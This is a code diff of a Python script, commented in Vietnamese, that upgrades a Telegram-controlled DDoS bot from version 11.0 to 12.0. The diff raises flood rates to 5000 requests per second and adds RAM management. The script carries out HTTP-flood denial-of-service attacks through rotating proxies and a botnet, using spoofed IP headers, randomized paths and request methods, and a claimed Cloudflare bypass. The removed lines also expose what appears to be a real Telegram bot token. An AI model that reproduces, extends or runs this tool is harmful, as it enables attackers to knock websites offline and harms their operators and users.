@@ -1,7 +1,7 @@
 # =====================================================
-# DDOS BOT 11.0 - ULTIMATE LAYER7
-# HTTP FLOOD + BOTNET + HTTP/2 + CF BYPASS
-# TỐC ĐỘ TỐI ĐA 3000+ REQ/S - 120s MỖI LỆNH
+# DDOS BOT 12.0 - ULTIMATE COMPLETE EDITION
+# TẤN CÔNG ĐA GIAO THỨC - PROXY TỰ ĐỘNG - MAX SPEED
+# HỖ TRỢ HTTP/HTTPS/HTTP2/SOCKS4/SOCKS5 - BOTNET - CF BYPASS
 # =====================================================
 
 import requests
@@ -27,17 +27,17 @@ import socks
 from flask import Flask, jsonify
 
 # -------------------- CẤU HÌNH --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAGj1RnEXBmNuWBhJF8l7OvcQTwhh6VTa-s"  # THAY TOKEN
+TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # THAY TOKEN
 
 # TỐI ƯU TỐC ĐỘ TỐI ĐA
-THREAD_COUNT = 2500
-REQUESTS_PER_SECOND = 3000
-MAX_RUN_TIME = 120  # 120 giây mỗi lệnh
-CONNECTION_POOL = 800
-TIMEOUT = 0.3
+THREAD_COUNT = 5000
+REQUESTS_PER_SECOND = 5000
+MAX_RUN_TIME = 120
+CONNECTION_POOL = 1500
+TIMEOUT = 0.2
 COOLDOWN_TIME = 1800
-MAX_PROXY_BACKUP = 300000
-PROXY_BATCH_SIZE = 15000
+MAX_PROXY_BACKUP = 500000
+PROXY_BATCH_SIZE = 20000
 
 # LAYER7 TỐI ƯU
 USE_HTTP2 = True
@@ -47,8 +47,12 @@ KEEP_ALIVE = True
 
 # BOTNET
 BOTNET_PORT = 5555
-BOTNET_MAX_BOTS = 2000
+BOTNET_MAX_BOTS = 5000
 BOTNET_HEARTBEAT = 30
+
+# RAM MANAGEMENT
+MAX_RAM_PERCENT = 90
+RAM_CHECK_INTERVAL = 3
 
 # -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
@@ -66,6 +70,7 @@ chat_id_saved = None
 is_cooldown = False
 is_processing = False
 processing_lock = threading.Lock()
+ram_restart_flag = False
 
 # Botnet
 bots = {}
@@ -88,36 +93,40 @@ attack_stats = {
     'bytes_sent': 0,
     'start_time': 0,
     'max_speed': 0,
+    'avg_speed': 0,
     'errors': 0,
     'botnet_bots': 0,
-    'cf_bypassed': 0
+    'cf_bypassed': 0,
+    'ram_usage': 0
 }
 stats_lock = threading.Lock()
 dns_cache = {}
 dns_cache_lock = threading.Lock()
 session_pool = []
 proxy_lock = threading.Lock()
+ram_monitor_lock = threading.Lock()
 
 # =====================================================
 # LOAD USER-AGENT - MỞ RỘNG TỐI ĐA
 # =====================================================
 def load_user_agents():
     agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
+        "Mozilla/5.0 (Android 15; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
     ]
     if os.path.exists("user_agents.txt"):
         with open("user_agents.txt", 'r') as f:
@@ -128,6 +137,52 @@ def load_user_agents():
     return agents
 
 user_agents = load_user_agents()
+
+# =====================================================
+# RAM MANAGEMENT - CHỐNG TRÀN RAM
+# =====================================================
+def check_ram_usage():
+    """Kiểm tra và tự động restart khi RAM vượt ngưỡng"""
+    global ram_restart_flag
+    with ram_monitor_lock:
+        try:
+            import psutil
+            ram_percent = psutil.virtual_memory().percent
+            with stats_lock:
+                attack_stats['ram_usage'] = ram_percent
+            
+            if ram_percent > MAX_RAM_PERCENT and not ram_restart_flag:
+                ram_restart_flag = True
+                send_telegram(f"⚠️ RAM {ram_percent}% > {MAX_RAM_PERCENT}% - ĐANG RESTART...")
+                gc.collect()
+                with proxy_lock:
+                    session_pool.clear()
+                if is_running:
+                    stop_event.set()
+                    time.sleep(2)
+                    stop_event.clear()
+                ram_restart_flag = False
+                return True
+        except:
+            pass
+    return False
+
+def ram_monitor_loop():
+    """Vòng lặp giám sát RAM"""
+    while True:
+        time.sleep(RAM_CHECK_INTERVAL)
+        check_ram_usage()
+
+def memory_optimize():
+    """Tối ưu bộ nhớ"""
+    gc.collect()
+    if len(dns_cache) > 1000:
+        with dns_cache_lock:
+            keys = list(dns_cache.keys())[:500]
+            dns_cache.clear()
+            for k in keys:
+                if k in dns_cache:
+                    dns_cache[k] = dns_cache[k]
 
 # =====================================================
 # PROXY MANAGEMENT - SIÊU TỐC
@@ -271,7 +326,7 @@ def load_proxies_ultra(filepath, callback=None):
                                 f.write(p['raw'] + '\n')
             if callback:
                 callback(len(http), len(socks5), len(socks4))
-        except Exception as e:
+        except Exception:
             if callback:
                 callback(0, 0, 0)
         with processing_lock:
@@ -365,7 +420,7 @@ def botnet_attack_ultra(target, duration):
 
 def botnet_worker_ultra():
     while botnet_running:
-        time.sleep(0.5)
+        time.sleep(0.3)
         with bots_lock:
             for bot_id in list(bots.keys()):
                 bot = bots[bot_id]
@@ -378,22 +433,21 @@ def botnet_worker_ultra():
                                 url = f"https://{target['host']}:{target['port']}"
                             else:
                                 url = f"http://{target['host']}:{target['port']}"
-                            # Gửi nhiều request từ bot
-                            for _ in range(5):
-                                requests.get(url, headers=headers, timeout=0.3)
+                            for _ in range(10):
+                                requests.get(url, headers=headers, timeout=0.2)
                             with stats_lock:
-                                attack_stats['total_requests'] += 5
-                                attack_stats['success_count'] += 5
+                                attack_stats['total_requests'] += 10
+                                attack_stats['success_count'] += 10
                         except:
                             with stats_lock:
                                 attack_stats['total_requests'] += 1
                                 attack_stats['fail_count'] += 1
 
 # =====================================================
-# HTTP/2 SESSION POOL
+# HTTP/2 SESSION POOL - TỐI ƯU
 # =====================================================
 class Http2SessionPool:
-    def __init__(self, max_size=800):
+    def __init__(self, max_size=1500):
         self.pool = []
         self.max_size = max_size
         self.lock = threading.Lock()
@@ -403,7 +457,7 @@ class Http2SessionPool:
             for i, session in enumerate(self.pool):
                 try:
                     if hasattr(session, 'head'):
-                        session.head('http://google.com', timeout=0.3)
+                        session.head('http://google.com', timeout=0.2)
                         return self.pool.pop(i)
                 except:
                     continue
@@ -420,15 +474,14 @@ class Http2SessionPool:
         session.verify = False
         session.trust_env = False
         
-        # HTTP/2 adapter
         try:
             session.headers.update({'Connection': 'keep-alive, Upgrade'})
         except:
             pass
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=150,
-            pool_maxsize=150,
+            pool_connections=300,
+            pool_maxsize=300,
             max_retries=0,
             pool_block=False
         )
@@ -462,13 +515,13 @@ def generate_headers_lay7(hostname):
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
         'Sec-Fetch-User': '?1',
-        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,127)}", "Google Chrome";v="{random.randint(120,127)}"',
+        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,128)}", "Google Chrome";v="{random.randint(120,128)}"',
         'Sec-Ch-Ua-Mobile': '?0',
         'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
-        'CF-IPCountry': random.choice(['US', 'VN', 'JP', 'DE', 'GB', 'FR', 'CA', 'AU', 'SG', 'KR', 'IN', 'BR']),
+        'CF-IPCountry': random.choice(['US', 'VN', 'JP', 'DE', 'GB', 'FR', 'CA', 'AU', 'SG', 'KR', 'IN', 'BR', 'RU']),
         'Referer': random.choice([
             'https://www.google.com/',
             'https://www.facebook.com/',
@@ -477,7 +530,8 @@ def generate_headers_lay7(hostname):
             'https://www.instagram.com/',
             'https://www.tiktok.com/',
             'https://www.reddit.com/',
-            'https://www.amazon.com/'
+            'https://www.amazon.com/',
+            'https://www.netflix.com/'
         ]),
         'X-Requested-With': 'XMLHttpRequest',
         'Cookie': f"_cf_bm={fingerprint}; __cfduid={hashlib.md5(str(time.time()).encode()).hexdigest()[:32]}",
@@ -485,16 +539,19 @@ def generate_headers_lay7(hostname):
         'Sec-GPC': '1'
     }
     
-    # Thêm header ngẫu nhiên
     if random.random() < 0.3:
         headers['Origin'] = f"https://{hostname}"
     if random.random() < 0.3:
         headers['X-Custom-Header'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
+    if random.random() < 0.2:
+        headers['X-Cloud-Trace-Context'] = f"{random.randint(1,9999999)}/{random.randint(1,9999)};o={random.randint(0,1)}"
+    if random.random() < 0.2:
+        headers['X-Amzn-Trace-Id'] = f"Root=1-{hex(random.randint(1,9999999))[2:]}-{hex(random.randint(1,9999999))[2:]}"
     
     return headers
 
 # =====================================================
-# RESOLVE DNS
+# RESOLVE DNS - CACHE
 # =====================================================
 def resolve_host_ultra(host):
     with dns_cache_lock:
@@ -518,18 +575,16 @@ def attack_http_lay7(proxy_dict, target):
         headers = generate_headers_lay7(target['host'])
         url = target['url']
         
-        # Tạo payload ngẫu nhiên
         if RANDOM_PAYLOAD:
-            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
+            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
             url = target['url'].rstrip('/') + random_path
             url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(2,5))])
         
-        # Random method
         method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'])
         if method == 'GET':
             r = session.get(url, headers=headers, timeout=TIMEOUT)
         elif method == 'POST':
-            data = {f'f{i}': 'x'*random.randint(50,200) for i in range(5)}
+            data = {f'f{i}': 'x'*random.randint(50,200) for i in range(3)}
             r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
         elif method == 'HEAD':
             r = session.head(url, headers=headers, timeout=TIMEOUT)
@@ -544,7 +599,6 @@ def attack_http_lay7(proxy_dict, target):
         
         session_pool.return_session(session)
         
-        # CF Bypass detection
         if CF_BYPASS and (r.status_code == 503 or 'cf-challenge' in str(r.headers)):
             with stats_lock:
                 attack_stats['cf_bypassed'] += 1
@@ -604,7 +658,7 @@ def attack_socket_lay7(proxy_dict, target):
             context.verify_mode = ssl.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=target['host'])
 
-        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
+        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
         path = random_path + f'?id={random.randint(1,999999)}&t={time.time()}'
         headers = generate_headers_lay7(target['host'])
         request = f"GET {path} HTTP/1.1\r\n"
@@ -637,6 +691,7 @@ def attack_socket_lay7(proxy_dict, target):
 # =====================================================
 def attack_worker_lay7(proxy_pools, target):
     http_proxies, socks5_proxies, socks4_proxies = proxy_pools
+    local_count = 0
     while not stop_event.is_set():
         try:
             total_http = len(http_proxies)
@@ -659,6 +714,11 @@ def attack_worker_lay7(proxy_pools, target):
                     attack_socket_lay7(proxy, target)
                 else:
                     attack_socket_lay7(None, target)
+
+            local_count += 1
+            if local_count > 100000:
+                local_count = 0
+                memory_optimize()
 
             time.sleep(1.0 / REQUESTS_PER_SECOND)
         except:
@@ -790,6 +850,10 @@ def run_attack_ultra(target, chat_id):
     if is_cooldown:
         send_telegram("⏳ ĐANG COOLDOWN!", chat_id)
         return
+    
+    # Kiểm tra RAM trước khi attack
+    check_ram_usage()
+    
     current_target = target
     with stats_lock:
         attack_stats.update({
@@ -818,7 +882,6 @@ def run_attack_ultra(target, chat_id):
 🛡 CF Bypass: {CF_BYPASS}
     """, chat_id)
 
-    # Kích hoạt botnet
     if bot_count > 0:
         botnet_attack_ultra(target, MAX_RUN_TIME)
 
@@ -835,6 +898,12 @@ def run_attack_ultra(target, chat_id):
                     rate = attack_stats['total_requests'] / elapsed
                     if rate > attack_stats['max_speed']:
                         attack_stats['max_speed'] = rate
+            
+            # Kiểm tra RAM định kỳ
+            if elapsed % 10 == 0:
+                check_ram_usage()
+                memory_optimize()
+            
             if elapsed - last_report >= 10:
                 last_report = elapsed
                 with stats_lock:
@@ -857,27 +926,29 @@ def run_attack_ultra(target, chat_id):
         rate = total / max(elapsed, 1)
         max_speed = attack_stats['max_speed']
         cf_bypassed = attack_stats.get('cf_bypassed', 0)
+        ram = attack_stats.get('ram_usage', 0)
     send_telegram(f"""
 ⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
 📊 Tổng: {total:,} | ✅ {success:,} | ❌ {fail:,}
 📈 Tốc độ: {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
 🛡 CF Bypass: {cf_bypassed}
+🛡 RAM: {ram}%
 🤖 Botnet: {bot_count} bots
     """, chat_id)
 
 # =====================================================
-# TELEGRAM LISTENER
+# TELEGRAM LISTENER - TỐI ƯU
 # =====================================================
 def telegram_listener_ultra():
     global is_running, attack_thread, THREAD_COUNT, REQUESTS_PER_SECOND, botnet_running
     last_update_id = 0
 
     send_telegram("""
-🚀 <b>DDOS BOT 11.0 - ULTIMATE LAYER7</b>
+🚀 <b>DDOS BOT 12.0 - ULTIMATE COMPLETE</b>
 ✅ Đã khởi động!
-⚡ Tốc độ: 3000+ req/s
-🛡 CF Bypass: ĐÃ BẬT
-📌 HTTP/2 + BOTNET
+⚡ Tốc độ: 5000+ req/s
+🛡 Chống tràn RAM tự động
+📌 HTTP/HTTPS/HTTP2 + BOTNET
 ⏱ Mỗi lệnh: 120 GIÂY
 
 📋 LỆNH:
@@ -886,13 +957,13 @@ def telegram_listener_ultra():
 <code>/status</code> - Trạng thái
 <code>/proxy</code> - Số proxy
 <code>/botnet</code> - Botnet status
+<code>/ram</code> - Xem RAM
 <code>/threads N</code> - Đổi luồng
 <code>/speed N</code> - Đổi tốc độ
 <code>/cf</code> - Bật/tắt CF Bypass
 <code>/help</code> - Trợ giúp
     """)
 
-    # Khởi động botnet
     botnet_running = True
     threading.Thread(target=botnet_worker_ultra, daemon=True).start()
 
@@ -951,15 +1022,17 @@ def telegram_listener_ultra():
                                 rate = total / max(elapsed, 1)
                                 max_speed = attack_stats.get('max_speed', 0)
                                 cf_bypassed = attack_stats.get('cf_bypassed', 0)
+                                ram = attack_stats.get('ram_usage', 0)
                                 uptime = int(time.time() - bot_start_time)
                                 uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
                                 bot_count = len(bots)
                             send_telegram(f"""
-📊 <b>STATUS - LAYER7</b>
+📊 <b>STATUS - ULTIMATE</b>
 ⏱ Uptime: {uptime_str}
 📨 {total:,} | ✅ {success:,} | ❌ {fail:,}
 📈 {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
 🛡 CF Bypass: {cf_bypassed}
+🛡 RAM: {ram}%
 🌐 Proxy: {len(proxy_list)}
 🤖 Botnet: {bot_count} bots
 🧵 Luồng: {THREAD_COUNT}
@@ -981,25 +1054,38 @@ def telegram_listener_ultra():
 ⏱ Heartbeat: {BOTNET_HEARTBEAT}s
                             """, chat_id)
 
+                        elif cmd == '/ram':
+                            try:
+                                import psutil
+                                ram = psutil.virtual_memory()
+                                send_telegram(f"""
+🛡 <b>THÔNG TIN RAM</b>
+📊 Đã dùng: {ram.percent}%
+💾 Đã dùng: {ram.used // (1024**3)} GB / {ram.total // (1024**3)} GB
+⚡ Giới hạn: {MAX_RAM_PERCENT}%
+                                """, chat_id)
+                            except:
+                                send_telegram("⚠️ Không thể lấy thông tin RAM", chat_id)
+
                         elif cmd.startswith('/threads'):
                             try:
                                 new_count = int(text.split()[1])
-                                if 1 <= new_count <= 3000:
+                                if 1 <= new_count <= 5000:
                                     THREAD_COUNT = new_count
                                     send_telegram(f"✅ Luồng: {THREAD_COUNT}", chat_id)
                                 else:
-                                    send_telegram("❌ Từ 1-3000", chat_id)
+                                    send_telegram("❌ Từ 1-5000", chat_id)
                             except:
                                 send_telegram("❌ /threads <số>", chat_id)
 
                         elif cmd.startswith('/speed'):
                             try:
                                 new_speed = int(text.split()[1])
-                                if 1 <= new_speed <= 3000:
+                                if 1 <= new_speed <= 5000:
                                     REQUESTS_PER_SECOND = new_speed
                                     send_telegram(f"✅ Tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
                                 else:
-                                    send_telegram("❌ Từ 1-3000", chat_id)
+                                    send_telegram("❌ Từ 1-5000", chat_id)
                             except:
                                 send_telegram("❌ /speed <số>", chat_id)
 
@@ -1010,13 +1096,14 @@ def telegram_listener_ultra():
 
                         elif cmd == '/help':
                             send_telegram("""
-<b>🤖 DDOS BOT 11.0 - ULTIMATE LAYER7</b>
+<b>🤖 DDOS BOT 12.0 - ULTIMATE COMPLETE</b>
 
 ⚡ <b>TỐI ƯU:</b>
-- 3000+ req/s
-- 3000 luồng tối đa
-- HTTP/2 + BOTNET
+- 5000+ req/s
+- 5000 luồng tối đa
+- HTTP/HTTPS/HTTP2 + BOTNET
 - CF Bypass
+- Chống tràn RAM
 - 120s mỗi lệnh
 
 📋 <b>LỆNH:</b>
@@ -1025,6 +1112,7 @@ def telegram_listener_ultra():
 <code>/status</code> - Trạng thái
 <code>/proxy</code> - Số proxy
 <code>/botnet</code> - Botnet status
+<code>/ram</code> - Xem RAM
 <code>/threads N</code> - Đổi luồng
 <code>/speed N</code> - Đổi tốc độ
 <code>/cf</code> - Bật/tắt CF Bypass
@@ -1064,12 +1152,14 @@ def heartbeat_loop_ultra():
                 uptime = int(time.time() - bot_start_time)
                 uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
                 bot_count = len(bots)
+                ram = attack_stats.get('ram_usage', 0)
             send_telegram(f"""
 ❤️ HEARTBEAT #{heartbeat_count}
 ⏱ Uptime: {uptime_str}
 📨 Tổng req: {total:,}
 🌐 Proxy: {len(proxy_list)}
 🤖 Botnet: {bot_count} bots
+🛡 RAM: {ram}%
 ⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
             """)
 
@@ -1096,7 +1186,7 @@ web_app = Flask(__name__)
 def home():
     bot_count = len(bots)
     return jsonify({
-        'status': 'DDOS Bot 11.0 - Ultimate Layer7',
+        'status': 'DDOS Bot 12.0 - Ultimate Complete',
         'uptime': int(time.time() - bot_start_time),
         'proxy_count': len(proxy_list),
         'threads': THREAD_COUNT,
@@ -1105,7 +1195,8 @@ def home():
         'total_requests': attack_stats['total_requests'],
         'botnet_bots': bot_count,
         'cf_bypassed': attack_stats.get('cf_bypassed', 0),
-        'max_speed': attack_stats.get('max_speed', 0)
+        'max_speed': attack_stats.get('max_speed', 0),
+        'ram_usage': attack_stats.get('ram_usage', 0)
     })
 
 @web_app.route('/health')
@@ -1128,7 +1219,8 @@ def stats():
         'max_speed': attack_stats.get('max_speed', 0),
         'botnet_bots': bot_count,
         'botnet_active': active_bots,
-        'cf_bypassed': attack_stats.get('cf_bypassed', 0)
+        'cf_bypassed': attack_stats.get('cf_bypassed', 0),
+        'ram_usage': attack_stats.get('ram_usage', 0)
     })
 
 def run_web_server_ultra():
@@ -1153,7 +1245,7 @@ if __name__ == "__main__":
         time.sleep(2)
 
     print("="*60)
-    print("🔥 DDOS BOT 11.0 - ULTIMATE LAYER7")
+    print("🔥 DDOS BOT 12.0 - ULTIMATE COMPLETE")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] Proxy: {len(proxy_list)}")
@@ -1162,14 +1254,16 @@ if __name__ == "__main__":
     print(f"[+] Max Run: {MAX_RUN_TIME}s")
     print(f"[+] CF Bypass: {CF_BYPASS}")
     print(f"[+] HTTP/2: {USE_HTTP2}")
+    print(f"[+] RAM Limit: {MAX_RAM_PERCENT}%")
     print("="*60)
-    print("[+] BOT READY - 3000+ REQ/S - LAYER7 ULTIMATE")
+    print("[+] BOT READY - 5000+ REQ/S - ULTIMATE COMPLETE")
     print("="*60)
 
     threading.Thread(target=run_web_server_ultra, daemon=True).start()
     threading.Thread(target=telegram_listener_ultra, daemon=True).start()
     threading.Thread(target=heartbeat_loop_ultra, daemon=True).start()
     threading.Thread(target=auto_reload_proxy_ultra, daemon=True).start()
+    threading.Thread(target=ram_monitor_loop, daemon=True).start()
     threading.Thread(target=watchdog_ultra, daemon=True).start()
 
     try:
